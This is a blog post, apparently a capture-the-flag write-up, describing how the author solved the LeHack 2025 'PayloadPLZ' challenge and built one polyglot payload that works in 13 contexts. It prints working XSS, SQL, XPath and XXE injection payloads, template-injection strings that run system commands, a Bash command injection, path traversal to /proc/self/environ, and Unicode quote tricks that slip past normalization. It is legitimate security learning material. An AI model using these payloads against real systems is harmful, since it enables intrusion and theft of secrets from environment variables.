+++
title = "LeHack 2025 - PayloadPLZ"
date = "2025-06-29"
description = ""
[extra]
cover.image = "images/LeHACK2025/payloadplz.png"
cover.alt = "LeHack 2025 - PayloadPLZ"
+++

Last weekend, I took part in the LeHack 2025 event in Paris. As always, the challenges hosted by YesWeHack were top-notch and full of valuable learning opportunities. This year's highlight was crafting a polyglot payload capable of triggering in 13 different contexts, including SQL injection, XSS, Bash command execution, and more.

<!--more-->

There was 2 ways to win YesWeHack swags:

- Complete all 13 challenges
- Solve at least 6 challenges using the same payload

Huge thanks to the organizers and the platform creator! The interface was intuitive and visually appealing, with excellent syntax highlighting. I especially appreciated the "wrap code" option and the ability to adjust the font size in the code view — perfect for folks like me who are... well, let's just say the eyes aren’t what they used to be. :older_man:

![](/images/LeHACK2025/sql-injection.png)


## Solving 13 challenges

Let's delve into how I solved every challenge, one by one, and identify some quick wins and interesting behavior for the second part of the contest.

### XSS 1

**Context**: The goal is to call `alert(flag)`

```html
<h1>Hello $INPUT</h1>
```

**Payload**: Any HTML tag than can trigger a JS execution (img onerror, svg onload, script).

```html
<img src=x onerror=alert(flag)>
```

### XSS 2

**Context**: Same context as XSS1, but the input is executed inside a script tag.

```html
<script>const x = '$INPUT'</script>
```

**Payload**: Escape from the `''` context and use a JavaScript comment to get rid of the quote.

```js
'+alert(flag)//
```


### SQL Injection 1

**Context**: The application uses SQLite3 to execute SQL queries, and the input is normalized using NFKC normalization. We are also given the structure of the database

```sql
-- Structure
CREATE TABLE users (username TEXT, password TEXT, age INTEGER);
CREATE TABLE flag (flag TEXT);
```

```sql
SELECT * FROM users WHERE username = '$INPUT'
```

**Payload**: Extract the `flag` from the `flag` table.

:warning: Each table argument of 'UNION' must have the same number of columns you can use `NULL` keyword to create empty column. - [Reference: SQLite UNION](https://www.sqlitetutorial.net/sqlite-union/)

```sql
' union select flag , null, null from flag --
```

### SQL Injection 2

**Context**: Same database structure and normalization as in SQL 1, but the injection occurs in an number comparison.

```sql
SELECT * FROM users WHERE age <$INPUT
```

**Payload**: Same payload as before, without the quote to close the string.

```ps1
9 union select flag , null, null from flag --
```

### XPath Injection

**Context**: Extract the password of the admin user. The structure of the XML was also given.

```xml
<db>
  <users>
    <user>
      <name>admin</name>
      <password>FLAG</password>
    </user>
    <user>
      <name>guest</name>
      <password>123456</password>
    </user>
  </users>
</db>
```

```xml
//user[name/text()="guest" and password/text()="$INPUT"]/name/text()
```

**Payload**: I hate XPATH it gives me headaches, here is the payload from ChatGPT. 

```ps1
"]|//user[name/text()="admin"]/password/text()|//user[name/text()="guest" and password/text()="
```

<center>
  <img src="/images/LeHACK2025/cost-gpt.png" alt="Description" />
  SPOILER ALERT: this shortcut cost me a lot.
</center>


### Jinja SSTI

**Context**: The flag is stored in the environment variable `FLAG`. There is no escaping applied to the user input, so you can inject Jinja2 expressions directly.

```py
from jinja2 import Environment
import os

template = os.environ.get("PAYLOAD", "")
env = Environment()
tmpl = env.from_string(template)
print(tmpl.render())
```

```py
Hello $INPUT
```

**Payload**: The check to validate the flag was a bit off, I discovered you could display every environment variables and it would be considered as a `SUCCESS` since the flag content was inside. The final payload was executing the `env` binary, thanks to Polidarius' research it is a very small payload: [Python vulnerabilities : Code execution in jinja templates - July 27, 2021](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/).

```ps1
{{ lipsum.__globals__["os"].popen('env').read() }} 
```


### Brainfuck

**Context**: The flag is split into two parts, the first part is stored in memory starting at address 0. The second part is available on stdin. The [brainfuck.js](https://payload-plz.com/sources/brainfuck.js) implementation was also given.

```js
// extract of the brainfuck.js file
const STOP = Symbol("stop");
const ops = {
    ">": () => ++fp,
    "<": () => --fp,
    "+": () => ++ram[fp],
    "-": () => --ram[fp],
    ".": () => stdout.push(ram[fp]),
    ",": () => ram[fp] = secondHalf.shift() ?? 0,
    "[": () => ram[fp] === 0 && search(1),
    "]": () => ram[fp] !== 0 && search(-1),
    undefined: () => STOP
};
```

**Payload**: Thank you `o4-mini` for your thinking.

```ps1
[.>],[.,]
```


### ERB SSTI

**Context**: Ruby ERB Server-Side Template Injection (SSTI) vulnerability. There is no escaping applied to the user input. The flag is stored in the environment variable FLAG.

```rb
require 'erb'
PAYLOAD = ENV['PAYLOAD'] || 'Payload'

# Render and output
output = ERB.new(PAYLOAD).result(binding)
puts output
```

**Payload**:

```rb
<%= ENV['FLAG'] %>
```


### Twig SSTI

**Context**: Twig Server-Side Template Injection (SSTI) vulnerability. Same context as the other SSTI.

```php
<?php
require __DIR__ . '/vendor/autoload.php';

use TwigLoaderArrayLoader;
use TwigEnvironment;

$PAYLOAD = getenv('PAYLOAD') ?: 'Payload';

$loader = new ArrayLoader(['index' => $PAYLOAD]);
$twig   = new Environment($loader, [
  'sandbox' => true,
]);

echo $twig->render('index', []);
```

**Payload**: Calling the `env` binary, because RCE > SSTI :hearts:

```py
{{['env']|filter('system')}}
```


### Smarty SSTI

**Context**: Same context as the other SSTI.

```php
<?php
require __DIR__ . '/vendor/autoload.php';

$PAYLOAD = getenv('PAYLOAD') ?: 'Hello, World!';
$smarty = new Smarty();

echo $smarty->fetch('eval:' . $PAYLOAD);
```

**Payload**: At first I fetched the content of the `/proc/self/environ` file, then I went back to the good old `env` binary.

```py
{fetch file='/proc/self/environ'}
{system('env')}
```


### Bash

**Context**: Command execution where you read the flag from the environment variable `FLAG`.

```ps1
ping -c 1 '$INPUT'
```

**Payload**:

<center>
  <img src="/images/LeHACK2025/env-meme.png" alt="Description" />
</center>

```ps1
';env;'
```


### XXE

**Context**: Use the XXE vulnerability to read the flag from a file. The flag is stored in `/dev/shm/flag.txt`.

```py
from lxml import etree
import os

xml = os.environ.get("PAYLOAD", "")

parser = etree.XMLParser(
    load_dtd=True,
    no_network=True,
    resolve_entities=True,
    recover=True,
)
doc = etree.fromstring(xml.encode(), parser)
print(doc.text)
```

```xml
<?xml version="1.0"?>
$INPUT
```

**Payload**: Basic XXE payload solves the challenge.

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///dev/shm/flag.txt'>]><root>&test;</root>
```


### Path Traversal

**Context**: Classical Path Traversal vulnerability in PHP.

```php
<?php
$PAYLOAD = getenv('PAYLOAD') ?: '';
print(file_get_contents($PAYLOAD));
```

```ps1
./$INPUT
```

**Payload**: Use `../` to go back to the root folder and then fetch the file containing the environment variables.

```ps1
../proc/self/environ
```


## Polyglot

> Craft a single payload that solves multiple challenges at once. The more challenges you solve, and the shorter your payload, the better your score.

The score was calculated using this formula: `score = (number of challenges solved × 1000) − payload length`

A polyglot payload is a specially crafted input that is valid in multiple different contexts or interpreters, allowing it to bypass security filters or be executed in more than one way depending on how and where it is used.


### XSS 1 and XSS 2

Let's start with the easy task of merging the 2 XSS payloads, we can put them one after the other: `'></script><img src=x onerror=alert(flag)>`

### SQL 1 and SQL 2

Things starts to get tricky for the SQL injections because of the quote from the payload of SQLi #1.

```sql
9 union select flag,flag,0 from flag
' union select flag,null,null from flag
```

We can use a SQLite commment "--" to remove it when it is un-necessary: `9 union select flag,flag,0 from flag--' union select flag,null,null from flag`

```sql
-- SQL1
SELECT * FROM users WHERE username = '9 union select flag,flag,0 from flag--' union select flag,null,null from flag--'

-- SQL2
SELECT * FROM users WHERE age <9 union select flag,flag,0 from flag--' union select flag,null,null from flag--
```

But I discovered later that I needed the quote to escape the Bash context, fortunately the description of the challenge is giving us a big hint about NFKC normalization. In short, unicode characters will be transformed into equivalent character. 

| Character | Unicode | Name                      | Normalizes to     |
|-----------|---------|---------------------------|-------------------|
| ʼ         | U+02BC  | MODIFIER LETTER APOSTROPHE | ' (U+0027)        |
| ʹ         | U+02B9  | MODIFIER LETTER PRIME      | ' (U+0027)        |
| ＇        | U+FF07  | FULLWIDTH APOSTROPHE        | ' (U+0027) OK     |

The payload is looking the same but the quote has been substituted to "＇".

```SQL
9 union select flag,flag,0 from flag--＇ union select flag,null,null from flag--
```

### Brainfuck

Since all invalid Brainfuck commands are removed, a cool trick was to include it at the start of the payload inside the SQL query. By putting it in the first column we don't have the "," that would break it.

```SQL
9 union select "[.>],[.,]",flag,0 from flag--＇ union select flag,null,null from flag--
```

### SSTI

Twig and Jinja 2 start with the delimiter `{{`, so we need to find a payload that would work on both. I opted for the easy solution by checking if lipsum was defined.

```py
{% if lipsum is defined %}
    {{lipsum.__globals__['os'].popen("env").read()}} # Jinja
{% else %}
    {{['env']|filter('system')}} # Twig
{% endif %}
```

Now, we can add the Smarty payload by encapsulating the previous payload inside Smarty comment.

```py
{system("env")}
{*
    {% if lipsum is defined %}
        {{lipsum.__globals__['os'].popen("env").read()}}
    {% else %}
        {{['env']|filter('system')}}
    {% endif %}
*}
```

Finally we can add the ERB SSTI, the Bash, and the Path Traversal payload after it.

```ps1
<%=ENV["FLAG"]%>
';env;'
/../../../proc/self/environ
```

### Final Payload

```ps1
9 union select "[.>],[.,]",flag,0 from flag--＇union select flag,null,null from flag--</script><img src=x onerror=alert(flag)>{system("env")}{*{% if lipsum is defined %}{{lipsum.__globals__['os'].popen("env").read()}}{% else %}{{['env']|filter('system')}}{% endif %}*}<%=ENV["FLAG"]%>';env;'/../../../proc/self/environ
```

After the event I noticed it was possible to reduce the size of this payload by replacing `null` to `0`, and removing spaces in the SSTI payloads.

```ps1
9 union select "[.>],[.,]",flag,0 from flag--＇union select flag,0,0 from flag--</script><img src=x onerror=alert(flag)>{system('env')}{*{%if lipsum is defined%}{{lipsum.__globals__['os'].system('env')}}{%else%}{{['env']|filter('system')}}{%endif%}*}<%=ENV["FLAG"]%>';env;'/../../../proc/self/environ
```

I also discovered too late that it was possible to merge the SQL injections and the XXE payloads :sad:. 

```ps1
<?or 1 union select flag,null,0 from flag--＇ union select flag,null,null from flag--?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///dev/shm/flag.txt'>]><root>&test;</root>
```

This payload is great but it doesn't work anymore for the Brainfuck category. A simple fix is to add a ">" at the start. Let's also reduce the size of the XXE by renaming the tags.

```ps1
<?or 1 union select ">[.>],[.,]",flag,0 from flag--＇union select flag,0,0 from flag--?><!DOCTYPE a[<!ENTITY b SYSTEM 'file:///dev/shm/flag.txt'>]><a>&b;</a></script><img src=x onerror=alert(flag)>{system('env')}{*{%if lipsum is defined%}{{lipsum.__globals__['os'].system('env')}}{%else%}{{['env']|filter('system')}}{%endif%}*}<%=ENV["FLAG"]%>';env;'/../../../../../../../proc/self/environ
```

## Conclusion

Now that the event is over, the solutions are displayed in the scoreboard, I'm ashamed too see that you could bypass the XPATH with a simple `anything"]|*?>`. Maybe o4-mini wasn't the right call to solve this part, next time I will use my brain :sweat_smile:.

Here are the last adjustments to complete the 13 challenges in one-shot:

* Switch quote from `<%=ENV["FLAG"]%>` to `<%=ENV['FLAG']%>`, to stay inside the double quote of the XPATH clause
* Put the Brainfuck payload inside Unicode double quote (`＂`) instead of the traditional (`"`)
* Add the XPATH equivalent of "OR 1=1": `"]|*?>`

```ps1
<?or 1 union select ＂>[.>],[.,]＂,flag,0 from flag--＇union select flag,0,0 from flag--?><!DOCTYPE a[<!ENTITY b SYSTEM 'file:///dev/shm/flag.txt'>]><a>&b;</a></script><img src=x onerror=alert(flag)>{system('env')}{*{%if lipsum is defined%}{{lipsum.__globals__['os'].system('env')}}{%else%}{{['env']|filter('system')}}{%endif%}*}<%=`env`%>';env;'"]|*?>/../../../../../../../proc/self/environ
```

![](/images/LeHACK2025/scoreboard.png)

But in the end, this payload wouldn't reach the top 3 (Best score: 12606). Congratulation to the winners, your payloads were awesome ! :heart_eyes:


## References

- [YesWeHack Payload PLZ Challenge](https://payload-plz.com)
- [SQLite UNION](https://www.sqlitetutorial.net/sqlite-union/)
- [Python vulnerabilities : Code execution in jinja templates - July 27, 2021](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/).